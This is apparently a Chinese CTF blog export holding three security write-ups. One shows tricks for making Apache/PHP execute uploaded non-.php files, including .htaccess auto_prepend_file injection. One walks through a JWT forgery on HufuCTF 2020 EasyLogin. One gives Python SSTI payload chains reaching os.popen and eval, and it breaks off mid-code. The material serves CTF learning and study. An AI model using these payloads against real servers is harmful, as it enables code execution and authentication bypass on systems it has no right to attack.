alt="image-20200517152713360"></p><p>可见网站的服务器并未让非php文件里代码被执行。这是为什么？</p><p>这是因为网站的服务器在处理这个非php文件时，并未让它进入php解释器处理，而直接将数据传送过来。</p><p>那么问题来了如让服务器把文件送入php解释器？</p><h3 id="1-更改服务器的httpd-conf配置"><a href="#1-更改服务器的httpd-conf配置" class="headerlink" title="1.更改服务器的httpd.conf配置"></a>1.更改服务器的httpd.conf配置</h3><p>这里改法又有两种方法</p><h4 id="（1）使用AddHandler-指令："><a href="#（1）使用AddHandler-指令：" class="headerlink" title="（1）使用AddHandler 指令："></a>（1）使用AddHandler 指令：</h4><p>AddHandler 说明什么样的扩展名使用什么样的程序来处理，描述的是扩展名与处理程序之间的关系。具体用法如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php5-script  .extension</span><br><span class="line">#或者</span><br><span class="line">AddHandler application&#x2F;x-httpd-php  .extension</span><br><span class="line"></span><br><span class="line">extension代表任意文件的后缀名</span><br></pre></td></tr></table></figure><p><img src="image-20200517171022134.png" alt="image-20200517171022134"></p><p><img src="image-20200517170537530.png" alt="image-20200517170537530"></p><h4 id="（2）使用AddType指令："><a href="#（2）使用AddType指令：" class="headerlink" title="（2）使用AddType指令："></a>（2）使用AddType指令：</h4><p>AddType指令在给定的文件扩展名与特定的内容类型之间建立映射关系.也可以用来描述后缀名与php解释器之间的关系：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType php5-script   .extension</span><br><span class="line">AddType application&#x2F;x-httpd-php  .extension</span><br></pre></td></tr></table></figure><p><img src="image-20200517172127721.png" alt="image-20200517172127721"></p><p><img src="image-20200517172408752.png" alt="image-20200517172408752"></p><h3 id="2-更改-htaccess文件"><a href="#2-更改-htaccess文件" class="headerlink" title="2.更改.htaccess文件"></a>2.更改.htaccess文件</h3><p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。如果要用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</p><p>在/www/htdocs/example目录下的.htaccess文件中放置指令，与在主配置文件中&lt;Directory /www/htdocs/example&gt;段中放置相同指令，是完全等效的。</p><p>另外, .htaccess文件中的配置指令作用于.htaccess文件所在的目录及其所有子目录，但要注意的是子目录中的 .htaccess中的指令会覆盖父目录的 .htaccess中的指令或者主配置文件中的指令。</p><p>我们可以在.htaccess文件中写入配置命令来达成我们的目的，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application&#x2F;x-httpd-php  .extension</span><br></pre></td></tr></table></figure><p><img src="image-20200517224034769.png" alt="image-20200517224034769"></p><h3 id="3-更改php-fpm-conf"><a href="#3-更改php-fpm-conf" class="headerlink" title="3.更改php-fpm.conf"></a>3.更改php-fpm.conf</h3><p>php-fpm中文名称php FastCGI 进程管理器。PHP FastCGI 进程管理器，用于管理PHP 进程池的软件，用于接受web服务器的请求。PHP-FPM提供了更好的PHP进程管理方式，可以有效控制内存和进程、可以平滑重载PHP配置。</p><p>php-fpm.conf文件里的security.limit_extensions 选项的参数作用是限制 FPM 允许解析的脚本扩展名。 此设置可以预防 web 服务器配置的错误。 应当限制 FPM 仅仅解析 .php 扩展名，阻止恶意用户使用其他扩展名运行 php 代码。 默认值： .php .phar</p><h3 id="4-利用文件包含来包含文件"><a href="#4-利用文件包含来包含文件" class="headerlink" title="4.利用文件包含来包含文件"></a>4.利用文件包含来包含文件</h3><h4 id="1-利用php函数包含代码执行"><a href="#1-利用php函数包含代码执行" class="headerlink" title="(1)利用php函数包含代码执行"></a>(1)利用php函数包含代码执行</h4><p>php在文件包含进行文件包含会执行php标记里代码。因此我们可以通过php的文件包含函数来通过一个执行的php页面来包含我们想要执行文件。</p><p>常见的文件包含的函数有：</p><p>1.include()  ：在包含文件没找到时会产生警告，并继续进行php代码。</p><p>2.include_once() ：在include() 的特性下，多了只能包含一次的特性。</p><p>3.require()：在包含文件没找到时会停止进行php代码。</p><p>4.require_once()：在require() 的特性下，多了只能包含一次的特性。</p><p>以上函数在执行时,会自动将要执行的脚本当成php来执行.</p><h4 id="2-利用-htaccess文件或php-ini文件来文件包含"><a href="#2-利用-htaccess文件或php-ini文件来文件包含" class="headerlink" title="(2)利用 .htaccess文件或php.ini文件来文件包含"></a>(2)利用 .htaccess文件或php.ini文件来文件包含</h4><p>同时也可以通过修改 .htaccess文件或php.ini文件,来进行文件.</p><p>php.ini中auto_prepend_file和auto_append_file分别可以在作用范围内的php文件在文件头/尾自动include指定文件并且可以支持php伪协议.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file 在页面顶部加载文件</span><br><span class="line">auto_append_file  在页面底部加载文件</span><br></pre></td></tr></table></figure><p>注意：auto_prepend_file 与 auto_append_file 只能包含一个php文件，但这个php文件内可以包含多个其他的php文件。</p><p>又 .htaccess文件中php_value 的设置可以设置php.ini里的选项。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file  shell.php</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64decode&#x2F;resource&#x3D;flag.php&quot;</span><br></pre></td></tr></table></figure><p>故可以把代码入<code>.htaccess</code>文件中，再通过auto_prepend_file/auto_append_file包含。即：</p><p><img src="image-20200612215358056.png" alt="image-20200612215358056"></p><p>同时,我们可以直接写入<code>shell</code>到<code>htaccess</code>文件本身再包含.例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file .htaccess</span><br><span class="line">#&lt;?php phpinfo();?&gt;\</span><br><span class="line">Hello, lexsd6</span><br></pre></td></tr></table></figure><p>这里要注意的是,末尾有个符号\是必须写入的.我们注意到源代码中file_put_contents中的文件内容传入的变量$content末尾还连接上了\nHello, world这个字符串，而<code>\n</code>代表着换行，而我们再一个\，则会拼接成<code>\\n</code>，即转义掉了n前面的\，构不成换行。换句话来说，如果我们加入了<code>\</code>在服务器解析<code>.htaccess</code>时，<code>#&lt;?php phpinfo();?&gt;\\nHello, lexsd6</code>会被当一行注释。</p><p><img src="image-20210222153140326.png" alt="image-20210222153140326"></p><h2 id="0x00参考文献"><a href="#0x00参考文献" class="headerlink" title="0x00参考文献"></a>0x00参考文献</h2><p><a href="https://www.php.net/manual/zh/language.basic-syntax.phpmode.php" target="_blank" rel="noopener">PHP 代码分离</a></p><p><a href="https://www.php.net/manual/zh/language.basic-syntax.instruction-separation.php" target="_blank" rel="noopener">php指令分割</a></p><p><a href="https://www.php.net/manual/zh/security.hiding.php" target="_blank" rel="noopener"> PHP 的文件后缀</a></p><p><a href="https://www.php.net/manual/zh/install.fpm.configuration.php" target="_blank" rel="noopener">FPM 的官方介绍</a></p><p><a href="https://baike.baidu.com/item/htaccess/1645473?fr=aladdin" target="_blank" rel="noopener">htaccess文件的介绍</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11741348.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11741348.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虎符CTF2020--EasyLogin WP</title>
      <link href="/2020/04/21/%E8%99%8E%E7%AC%A6CTF2020--EasyLogin%20%20%20Write%20%20up/"/>
      <url>/2020/04/21/%E8%99%8E%E7%AC%A6CTF2020--EasyLogin%20%20%20Write%20%20up/</url>
      
        <content type="html"><![CDATA[<p>最近因为疫情来家研究web,恰好前几天刚刚看了jwt正好在比赛上碰上于是写个简单wp的同时小小总结一下.</p><a id="more"></a><h2 id="0x01考点总汇"><a href="#0x01考点总汇" class="headerlink" title="0x01考点总汇"></a>0x01考点总汇</h2><ol><li>jwt令牌伪造</li><li>NodeJS 代码审计</li><li>NodeJS弱类型特性利用</li><li>jsonwebtoken 库缺陷</li></ol><h2 id="0x02解题思路分析"><a href="#0x02解题思路分析" class="headerlink" title="0x02解题思路分析"></a>0x02解题思路分析</h2><p>打开题目，从题目描述’<img src="image-20200421101720306.png" alt="image-20200421101720306">‘中得到三个信息 题目环境是nodejs开发、可能有代码逻辑漏洞、可能是依赖库逻辑漏洞。</p><p>带着问题具体进入环境分析。发现是一个登陆界面。同时带有跳转至帐户注册的按钮。(一般情况下，由注册功能一般没有sql注入漏洞)</p><p><img src="image-20200421104215171.png" alt="image-20200421104215171"></p><p>随便输入一个帐户密码，发现回显了一个奇怪的回显——‘Cannot read property ‘split’ of undefined‘而不是’帐户密码错误或不存在’之类的提示。所以怀疑登陆这可能存在逻辑问题。</p><p><img src="image-20200421104132782.png" alt="image-20200421104132782"></p><p>抓包发分析，发现authorization的值为空。</p><p><img src="image-20200421104034329.png" alt="image-20200421104034329"></p><p>进入帐户注册进行注册，发现用户名为admin无法注册。怀疑管理员帐户用户名为admin。</p><p><img src="image-20200421110531022.png" alt="image-20200421110531022"></p><p>注册帐户登陆进入发现要flag的权限不够。</p><p><img src="image-20200421111725354.png" alt="image-20200421111725354"></p><p>再退回抓取登陆包</p><p><img src="image-20200421111941094.png" alt="image-20200421111941094"></p><p>发现authorization的值有了。对其值进行base64解码。发现这个是个jwt令牌</p><p><img src="image-20200421112825513.png" alt="image-20200421112825513"></p><p>推测是不是可以用jwt令牌伪造绕过。</p><p>关于jwt令牌详细机制可以参考下：<a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html这篇文章。" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html这篇文章。</a></p><p>这里再强调一下,jwt令牌由三部分组成:</p><ul><li>Header（头部）:有加密算法与令牌类型构成.</li><li>Payload（负载）:用来存放实际需要传递的数据.</li><li>Signature（签名）:主要通过一个加密密钥,用Header里的加密算法来加密 base64url加密后的Header与Payload数据.</li></ul><p>因此通过控制jwt的Header中加密算法与Signature中加密钥匙，就可以伪造出一个jwt令牌。由于之前的加密中我已经得到了加密算法是HS256，所以尝试使用工具：c-jwt-cracker（<a href="https://github.com/brendan-rius/c-jwt-cracker）结果发现半爆不出来，猜测密钥长度过长转换思路。" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker）结果发现半爆不出来，猜测密钥长度过长转换思路。</a></p><p>在查看网站源代码在/static/js/app.js下发现提示</p><p><img src="image-20200421161224525.png" alt="image-20200421161224525"></p><p>猜测配置错误路径，猜测NodeJS的常用文件名如api.js、app.js、controller.jsd等。但在主目录下</p><p>app.js</p><p><img src="image-20200421163813964.png" alt="image-20200421163813964"></p><p>在app.js发现环境中发现还有rest与controller目录继续猜下面的文件名。</p><p>在controller目录发现了api.js文件,我们要要的关于登陆页面的jwt相关信息的代码</p><p><img src="image-20200421171905148.png" alt="image-20200421171905148"></p><p>对这段代码审计可以知道secret与jwt令牌中的sid参数有关.同时我们还知道用 jsonwebtoken 库来操作jwt令牌的制作,但jsonwebtoken 库jwt.verify函数有个漏洞:验证时只要密钥(secret)处为 undefined 或者空之类的，即便后面的算法指名为 HS256，验证也还是按照 none 来验证通过.</p><p>因此我们可以想办法控制sid参数来让secret为空或 undefined .由于js是弱类型型的语言我们可以通过数字的索引为小数、大括号、中括号的方式来让返回值为undefined 。</p><p><img src="image-20200421175115467.png" alt="image-20200421175115467"></p><p>同理利用弱类型特性,我们可以通过sid为小数或空数组来绕过红圈里的 <code>if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)</code></p><p><img src="image-20200421224458833.png" alt="image-20200421224458833"></p><p>利用脚本构造jwt</p><p><img src="20200421232103.png" alt="image-20200421232103"></p><p>抓取包替换</p><p><img src="image-20200421234605518.png" alt="image-20200421234605518"></p><p>抓取get flag包得到flag</p><p><img src="image-20200421234701597.png" alt="image-20200421234701597"></p><h2 id="0x03关于jwt解题思路的总结"><a href="#0x03关于jwt解题思路的总结" class="headerlink" title="0x03关于jwt解题思路的总结"></a>0x03关于jwt解题思路的总结</h2><p>同时关于jwt的解题有思路有4种</p><h4 id="1-修改算法为none"><a href="#1-修改算法为none" class="headerlink" title="1.修改算法为none"></a>1.修改算法为none</h4><p>修改算法有两种修改的方式其中一种就是将算法就该为none.</p><p>像本题一样,后端若是支持none算法.header中的alg字段可被修改为none.去掉JWT中的signature数据（仅剩header + ‘.’ + payload + ‘.’） 然后直接提交到服务端去.</p><h4 id="2-修改算法RS256为HS256"><a href="#2-修改算法RS256为HS256" class="headerlink" title="2.修改算法RS256为HS256"></a>2.修改算法RS256为HS256</h4><p>RS256是非对称加密算法，HS是对称加密算法.</p><p>如果jwt内部的函数支持的RS256算法，又同时支持HS256算法.</p><p>如果已知公钥的话，将算法改成HS256，然后后端就会用这个公钥当作密钥来加密</p><h4 id="3信息泄露"><a href="#3信息泄露" class="headerlink" title="3信息泄露"></a>3信息泄露</h4><p>JWT是以base64编码传输的，虽然密钥不可见，但是其数据记本上是明文传输的，如果传输了重要的内容，可以base64解码然后获取其重要的信息。这里推荐网站<a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p><h4 id="4爆破密钥"><a href="#4爆破密钥" class="headerlink" title="4爆破密钥"></a>4爆破密钥</h4><p>原理就是，如果密钥比较短的话，已知加密算法，通过暴力破解的方式，可以得到其密钥.例如;通过c-jwt-cracker（<a href="https://github.com/brendan-rius/c-jwt-cracker）进行爆破。" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker）进行爆破。</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于python ssti的思考</title>
      <link href="/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h2 id="0x1关于ssti的讲解"><a href="#0x1关于ssti的讲解" class="headerlink" title="0x1关于ssti的讲解"></a>0x1关于ssti的讲解</h2><p>1.什么是ssti?</p><p>SSTI就是服务器端模板注入(Server-Side Template Injection).在一般的ctf中主要考查python比较多，故这篇文章主要是分析python下的ssti。</p><a id="more"></a><p>2.ssti出现的原因</p><p>ssti起因是在通过与服务端模板的输入输出交互时,服务器端把用户提交的数据处理,当成了代码来执行.从而让恶意用户通过构建了恶意代码,来读取了服务器上的信息或得到了服务器的shell.例如：在python的flask中，会把<code>{ {</code> <code>} }</code>号里面的参数当成代码来执行，如<code>{ {1+1} }</code>会被执行成为<code>{ {2} }</code>。</p><p>3.ssti漏洞的发现</p><p>对目标机构造payload来分析，如<code>{ {7+7} }</code>，<code>{ {&#39;7&#39;+&#39;7&#39;} }</code>等。看是否有ssti。再参考下图分析是何种模板的ssti</p><p><img src="image-20200327224713117.png" alt="image-20200327224713117"></p><p>​    </p><h2 id="0x2python基础"><a href="#0x2python基础" class="headerlink" title="0x2python基础"></a>0x2python基础</h2><h3 id="01-python魔术方法"><a href="#01-python魔术方法" class="headerlink" title="01.python魔术方法"></a>01.python魔术方法</h3><p>由于python的语法一贯奉行“一切皆是对象”的原则，所以python的一切变量都由类实例而来同时python有很多管理这些类与对象的内置魔术方法或函数。下面介绍几个常用的与类有关的魔术方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>） __class__</span><br><span class="line"><span class="comment">#__class__功能和type()函数一样，都是查看对象所在的类（子实例找父实例）。</span></span><br><span class="line"><span class="number">2</span>）__base__</span><br><span class="line"><span class="comment">#__base__的作用是查询一个类的父类。</span></span><br><span class="line"><span class="number">3</span>）__mro__</span><br><span class="line"><span class="comment">#返回包含回朔一个类所由继承过的父类的元组。</span></span><br><span class="line"><span class="number">4</span>）__subclasses__()</span><br><span class="line"><span class="comment">#返回包含一个类的所有子类的列表。</span></span><br><span class="line"><span class="number">5</span>）__builtins__()</span><br><span class="line"><span class="comment">#builtins就是内置模块的一个引用。像__import__()、open、eval等内置函数所在的模块就内置模块。大多数模块都将名称 __builtins__ 作为其全局变量的一部分.</span></span><br><span class="line"><span class="number">6</span>）__init__</span><br><span class="line"><span class="comment">#类实例化出一个对象时进行初始化方法。</span></span><br><span class="line"><span class="number">7</span>）__globals__</span><br><span class="line"><span class="comment">#返回一个函数所在空间的所有类、属性、子模块与方法的字典。</span></span><br><span class="line"><span class="number">8</span>）__dict__</span><br><span class="line"><span class="comment">#返回包含一个模块所拥有类、属性、子模块与方法的字典。</span></span><br><span class="line"><span class="number">9</span>）__getattribute__</span><br><span class="line"><span class="comment">#虽然这个魔术方法该方法可以拦截对对象属性的所有访问企图。但也有访问对象属性的功能。可以用来进行一些绕过。</span></span><br></pre></td></tr></table></figure><h3 id="02-文件操作和命令执行相关的python模块"><a href="#02-文件操作和命令执行相关的python模块" class="headerlink" title="02.文件操作和命令执行相关的python模块"></a>02.文件操作和命令执行相关的python模块</h3><h6 id="1-builtins模块"><a href="#1-builtins模块" class="headerlink" title="1)builtins模块"></a>1)builtins模块</h6><p>是python的一个内置函数所在模块,里面的函数无需import就能访问。</p><ol><li><p>eval()</p><p>执行1句简单的python代码，并返回结果。</p></li><li><p>exec()</p><p>执行多句python代码，但返回值永远为None。</p></li><li><p>open()</p><p>打开一个文件</p></li></ol><h6 id="2）os模块"><a href="#2）os模块" class="headerlink" title="2）os模块"></a>2）os模块</h6><p>该模块提供了一些方便使用操作系统相关功能的函数。这主要说与文件操作和命令执行相关的函数</p><ol><li><p>os.system  (cmd)</p><p>执行操作系统(shell)命令，若执行成功返回值为0。</p></li><li><p>os.popen(cmd)  .read()</p><p>os.popen()函数可以用来执行操作系统(shell)命令。通过read()函数来读取返回结果。除此外还有so.popen2(),so.popen3().</p></li><li><p>os.open(filename)</p><p>可以用来打开读取文件。</p></li></ol><h6 id="3-platform模块"><a href="#3-platform模块" class="headerlink" title="3)platform模块"></a>3)platform模块</h6><p> python中，platform模块给我们提供了很多方法去管理操作系统。</p><ol><li><p>platform.popen(cmd, mode=’r’, bufsize=None) </p><p>platform.popen函数可以用来执行操作系统(shell)命令。但与os.popen()函数通类似过read()函数来读取返回结果。                 </p></li></ol><h6 id="4-timeit-模块"><a href="#4-timeit-模块" class="headerlink" title="4)timeit 模块"></a>4)timeit 模块</h6><p>​        模块中的timeit.timeit() 本是检测性能的，也可以任意代码执行。但是没有回显。用法如timeit.timeit(“<strong>import</strong>(‘os’).system(cmd)”,number=1)         </p><h6 id="5-commands模块"><a href="#5-commands模块" class="headerlink" title="5)commands模块"></a>5)commands模块</h6><p>commands模块只存在于Python 2.7中，且不支持windows平台，因此commands模块很少被使用。另外，commands模块实际上也是通过对os.popen()的封装来完成的。</p><ol><li><p>commands.getoutput(cmd)</p><p>接收字符串格式的命令，执行命令并返回执行结果。</p></li><li><p>commands.getstatusoutput(cmd)</p><p>执行cmd命令，返回一个元组(命令执行状态,命令执行结果输出)。</p></li></ol><h6 id="6-subprocess模块"><a href="#6-subprocess模块" class="headerlink" title="6)subprocess模块"></a>6)subprocess模块</h6><p>subprocess 模块允许你生成新的进程，连接它们的输入、输出、错误管道.此模块打算代替一些老旧的模块与功能如：os模块、commands模块等。</p><ol><li><p>subprocess.run(cmd)</p><p>Python 3.5版本以后才有的函数。执行指定的命令，等待命令执行完成后返回一个包含执行结果的CompletedProcess类的实例</p></li><li><p>subprocess.call(cmd,shell=True)</p><p>执行由参数提供的命令。我们可以用数组作为参数运行命令，也可以用字符串作为参数运行命令(通过设置参数shell=True)如果执行成功则返回状态码。</p></li><li><p>subprocess.check_call(cmd)</p><p>执行指定的命令，如果执行成功则返回状态码，否则抛出异常.</p></li><li><p>subprocess.check_output(cmd)</p><p>执行指定的命令，如果执行成功则返回结果，否则抛出异常.</p></li><li><p>subprocess.getstatusoutput(cmd)</p><p>执行cmd命令，返回一个元组(命令执行状态,命令执行结果输出)。</p></li><li><p>subprocess.getoutput(cmd)</p><p>接收字符串格式的命令，执行命令并返回执行结果。</p></li></ol><h3 id="03-一些提高效率的函数"><a href="#03-一些提高效率的函数" class="headerlink" title="03.一些提高效率的函数"></a>03.一些提高效率的函数</h3><p>1.index()</p><p>检查字符串是否包含某个字符或字符串。还有可以用来查询列表里是否有某个元素。若春在则返回第一次出现时的下标或索引。ps：当参数有.符号时可能出现该函数查不出来但存在的现象（解析逻辑问题）</p><p>2.keys()</p><p>将键的单独提取成一个列表。在某些过滤了中括号的情况下与index()用来代替中括号的效果。</p><h3 id="04-关于flask"><a href="#04-关于flask" class="headerlink" title="04.关于flask"></a>04.关于flask</h3><p>flask由 Jinja2 模板开发而来的web框架。缺省情况下，以下全局变量可以在 Jinja2 模板中使用，同时也值得我们关注：</p><h4 id="1-config"><a href="#1-config" class="headerlink" title="1) config"></a>1) config</h4><p>获取当前配置对象（ flask.config ）,可以得到些配置信息(有点类似php中phpinfo的作用).比如:是否打开session,SECRET_KEY(python默认的session加密方式的密钥）的值。</p><p>在 version 0.10后,这个变量总是可用，甚至是在被导入的模板中。</p><p>这个对象是在 version 0.6. 后才有的.</p><h4 id="2-request"><a href="#2-request" class="headerlink" title="2)request"></a>2)request</h4><p>获取请求对象（ flask.request ）。 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p><h4 id="3-session"><a href="#3-session" class="headerlink" title="3)session"></a>3)session</h4><p>获取当前会话对象（ flask.session ）。 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p><h4 id="4-g"><a href="#4-g" class="headerlink" title="4)g"></a>4)g</h4><p>请求绑定的全局变量（ flask.g ）。在flask中，有一个专门用来存储用户信息的g对象，g的全称的为global。g对象在一次请求中的所有的代码的地方，都是可以使用的。 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p><h4 id="5-url-for"><a href="#5-url-for" class="headerlink" title="5)url_for()"></a>5)url_for()</h4><p>flask.url_for() 函数。url_for() 会返回传入的路由函数对应的URL，所谓路由函数就是被 app.route() 路由装饰器装饰的函数。如果我们定义的路由函数是带有参数的，则可以将这些参数作为命名参数传入。</p><h5 id="6-get-flashed-messages"><a href="#6-get-flashed-messages" class="headerlink" title="6)get_flashed_messages()"></a>6)get_flashed_messages()</h5><p>flask.get_flashed_messages() 函数。返回之前在Flask中通过 flash() 传入的信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出。</p><h2 id="0x3ssti注入的一般攻击流程"><a href="#0x3ssti注入的一般攻击流程" class="headerlink" title="0x3ssti注入的一般攻击流程"></a>0x3ssti注入的一般攻击流程</h2><p>1.找到环境中的可以使用的环境变量,例如:内置函数方法（url_for()函数、get_flashed_messages()函数）、内置类的实例变量(‘’,[]，config，self)。</p><p>2.若已得到内置函数方法则跳第4步骤，从内置类的实例变量方向出发的通过类的关系通过<code>__class__、__base__ or  __mro__</code>找到基本类（object类）.注意：python2与python3这步有的差别。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python 2:</span></span><br><span class="line">  <span class="comment"># __base__路线</span></span><br><span class="line">      <span class="string">''</span>.__class__.__base__.__base__</span><br><span class="line">      <span class="comment">#__mro__路线1</span></span><br><span class="line">       <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line"><span class="comment">#python 3:</span></span><br><span class="line">       <span class="comment"># __base__路线</span></span><br><span class="line">       <span class="string">''</span>.__class__.__base__</span><br><span class="line">       <span class="comment">#__mro__路线1</span></span><br><span class="line">        <span class="string">''</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">       </span><br><span class="line"> <span class="comment">#python 2/3 都可以用 的__mro__路线</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><p>3.通过<code>__subclasses__()</code>获取所有object类的子类，并用 <code>__dict__</code>从中寻找类其拥有的方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()</span><br><span class="line"><span class="comment">#获取所有object类的子类</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[x].__dict__</span><br><span class="line"><span class="comment">#x表__subclasses__()返回列表的任意存在索引。</span></span><br><span class="line"><span class="comment">#__dict__ 中带有&lt;function __init__ at 0x7f8a189dc320&gt;  或&lt;unbound method WarningMessage.__init__&gt;就是我们可以利用的方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#大多数类重载的了__init__方法，__init__方法也有__globals__属性。因此我们可以直接遍历x找带有__init__的类。</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[x].__init__</span><br></pre></td></tr></table></figure><p>4.通过<code>__globals__</code>或<code>func_globals</code>得到的方法所在空间的所有类、属性、子模块与方法。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">url_for.func_globals</span><br><span class="line">url_for.__globals__</span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].__init__.__globals__</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].__init__.func_globals</span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].reset.__globals__</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].reset.func_globals</span><br></pre></td></tr></table></figure><p>5若上一步返回的结果里有需要的方法就可以直接调用;若想调用内置库的函数用<strong>builtins</strong> ;若想调用第三方库（模块）可以继续用<strong>import</strong>载入:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#若上一步返回的结果里有需要的方法就可以直接调用;</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].__init__.func_globals.getreader</span><br><span class="line"><span class="comment">#若想调用内置库的函数,利用__builtins__属性:</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].__init__.func_globals.__builtins__.eval()</span><br><span class="line"><span class="comment">#若想调用第三方库（模块）可以后加__import__载入;</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].__init__.func_globals.__builtins__.__import__(<span class="string">'os'</span>).popen</span><br></pre></td></tr></table></figure><h2 id="0x4常见绕过方式"><a href="#0x4常见绕过方式" class="headerlink" title="0x4常见绕过方式"></a>0x4常见绕过方式</h2><h6 id="1-过滤中括号"><a href="#1-过滤中括号" class="headerlink" title="1)过滤中括号"></a>1)过滤中括号</h6><ol><li><p><code>__getitem__</code>方法，该方法用来获取指定索引对应的元素。</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">40</span>)</span><br><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">79</span>).__init__.__globals__.__builtins__.__getitem__(<span class="string">'ord'</span>)</span><br><span class="line"><span 